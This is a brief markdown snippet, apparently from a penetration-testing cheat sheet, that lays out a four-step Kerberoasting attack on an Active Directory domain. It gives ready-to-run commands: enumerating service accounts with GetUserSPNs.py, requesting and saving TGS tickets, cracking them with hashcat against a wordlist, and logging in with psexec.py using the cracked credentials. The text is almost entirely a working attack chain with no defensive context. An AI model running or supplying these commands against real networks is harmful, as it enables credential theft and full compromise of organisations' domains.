# Example 1: Domain Compromise via Kerberoasting

```bash
# 1. Find service accounts with SPNs
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10

# 2. Request TGS tickets
GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# 3. Crack tickets
hashcat -m 13100 tgs.txt rockyou.txt

# 4. Use cracked service account
psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
```